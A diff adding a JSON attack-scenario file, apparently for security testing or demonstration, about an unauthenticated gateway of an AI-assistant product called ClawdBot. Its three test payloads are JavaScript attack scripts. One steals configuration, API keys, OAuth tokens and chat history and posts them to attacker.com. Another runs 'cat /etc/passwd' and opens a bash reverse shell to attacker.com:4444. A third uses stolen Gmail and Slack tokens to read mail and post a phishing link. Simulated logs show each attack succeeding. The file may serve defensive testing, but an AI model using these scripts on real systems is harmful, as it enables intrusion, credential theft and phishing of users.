@@ -1,0 +1,63 @@
+{
+  "name": "Gateway Unauthorized Access",
+  "systemPrompt": "[ClawdBot Gateway - Default Configuration]\n\nGateway configuration:\n- Port: 18789\n- Authentication: None (auth.mode = none)\n- Tailscale: Disabled\n- External access: Allowed\n\nWarning: This configuration has CVE-2025-49596 vulnerability\nAnyone can connect and perform operations\n\nExposed instances (Shodan statistics):\n- Total: Hundreds\n- Completely unauthenticated: 8+\n- Weak authentication: 50+",
+  "attacks": {
+    "gateway-config-theft": {
+      "name": "Gateway Configuration Theft",
+      "description": "Exploits the unauthenticated Gateway WebSocket interface to steal the complete configuration",
+      "testPayload": "// Attacker script\nconst ws = new WebSocket('ws://target:18789/gateway');\n\nws.onopen = () => {\n  // Get complete configuration\n  ws.send(JSON.stringify({ type: 'config.get' }));\n\n  // Get OAuth tokens\n  ws.send(JSON.stringify({ type: 'auth.tokens.list' }));\n\n  // Get conversation history\n  ws.send(JSON.stringify({ type: 'conversations.list', limit: 100 }));\n};\n\nws.onmessage = (event) => {\n  const data = JSON.parse(event.data);\n  console.log('Exfiltrated:', data);\n  // Send to attacker server\n  fetch('https://attacker.com/collect', {\n    method: 'POST',\n    body: event.data\n  });\n};",
+      "conversations": {
+        "0": "(Attacker discovers exposed ClawdBot instance via Shodan, connects to Gateway)",
+        "1": "[Gateway Log]\nNew connection: 203.0.113.42:54321\nAuthentication: Skipped (auth.mode = none)\n\nRequest received: config.get\nResponse: {\n  \"apiKey\": \"sk-ant-xxx...\",\n  \"oauthTokens\": {...}\n}\n\nRequest received: auth.tokens.list\nResponse: [Gmail, Slack, Discord tokens...]\n\nRequest received: conversations.list\nResponse: [100 conversation records...]\n\nConnection closed"
+      },
+      "logs": {
+        "0": "External IP connecting to Gateway: 203.0.113.42",
+        "1": "Authentication check: auth.mode = none",
+        "2": "Authentication skipped, connection allowed",
+        "3": "Request: config.get",
+        "4": "Returned: API keys, OAuth Tokens",
+        "5": "Request: auth.tokens.list",
+        "6": "Returned: Gmail, Slack, Discord tokens",
+        "7": "Request: conversations.list",
+        "8": "Returned: 100 conversation records",
+        "9": "CVE-2025-49596: Unauthorized access, complete configuration leaked"
+      }
+    },
+    "gateway-rce": {
+      "name": "Gateway Remote Command Execution",
+      "description": "Exploits the unauthenticated Gateway to execute arbitrary commands",
+      "testPayload": "// Attacker script - Remote command execution\nconst ws = new WebSocket('ws://target:18789/gateway');\n\nws.onopen = () => {\n  // Execute system commands\n  ws.send(JSON.stringify({\n    type: 'tool.call',\n    tool: 'run_command',\n    params: {\n      command: 'id && whoami && cat /etc/passwd'\n    }\n  }));\n\n  // Establish reverse shell\n  ws.send(JSON.stringify({\n    type: 'tool.call',\n    tool: 'run_command',\n    params: {\n      command: 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'\n    }\n  }));\n};",
+      "conversations": {
+        "0": "(Attacker executes commands through the exposed Gateway)",
+        "1": "[Gateway Log]\nTool call request received:\n  tool: run_command\n  params: { command: \"id && whoami && cat /etc/passwd\" }\n\nExecution result:\nuid=1000(clawdbot) gid=1000(clawdbot)\nclawdbot\nroot:x:0:0:root:/root:/bin/bash\n...\n\nTool call request received:\n  tool: run_command\n  params: { command: \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\" }\n\n[Connection established to attacker.com:4444]"
+      },
+      "logs": {
+        "0": "Received tool.call request",
+        "1": "Executing command: id && whoami && cat /etc/passwd",
+        "2": "Returned: System user information",
+        "3": "Executing command: bash reverse shell",
+        "4": "Reverse shell established to attacker server",
+        "5": "System fully compromised"
+      }
+    },
+    "gateway-account-takeover": {
+      "name": "Gateway Account Takeover",
+      "description": "Uses stolen OAuth Tokens to take over user's messaging platform accounts",
+      "testPayload": "// Attacker script - Account takeover\nconst ws = new WebSocket('ws://target:18789/gateway');\n\nws.onopen = async () => {\n  // Get tokens\n  const response = await sendAndWait(ws, { type: 'auth.tokens.list' });\n\n  // Use Gmail token to read emails\n  const gmailToken = response.tokens.gmail;\n  const emails = await fetch('https://gmail.googleapis.com/gmail/v1/users/me/messages', {\n    headers: { 'Authorization': 'Bearer ' + gmailToken }\n  });\n\n  // Use Slack token to send messages\n  const slackToken = response.tokens.slack;\n  await fetch('https://slack.com/api/chat.postMessage', {\n    method: 'POST',\n    headers: { 'Authorization': 'Bearer ' + slackToken },\n    body: JSON.stringify({\n      channel: '#general',\n      text: 'Urgent notice: Please click this link to reset your password https://evil.com/reset'\n    })\n  });\n};",
+      "conversations": {
+        "0": "(Attacker uses stolen Tokens to take over accounts)",
+        "1": "[Attacker Operation Log]\n\n1. Using Gmail Token to access mailbox:\n   - Read last 100 emails\n   - Found sensitive emails: bank statements, password reset links\n\n2. Using Slack Token to send phishing messages:\n   - Sent to #general: Urgent notice...\n   - Sent to #engineering: New code review request...\n\n3. Using Discord Token:\n   - Modified server settings\n   - Sent malicious links to all members\n\nAccounts fully taken over."
+      },
+      "logs": {
+        "0": "Using stolen Gmail Token",
+        "1": "Reading mailbox: 100 emails",
+        "2": "Using stolen Slack Token",
+        "3": "Sending phishing message to #general",
+        "4": "Using stolen Discord Token",
+        "5": "Modifying server settings",
+        "6": "Multiple accounts taken over",
+        "7": "Lateral movement: Phishing attacks sent to colleagues"
+      }
+    }
+  }
+}
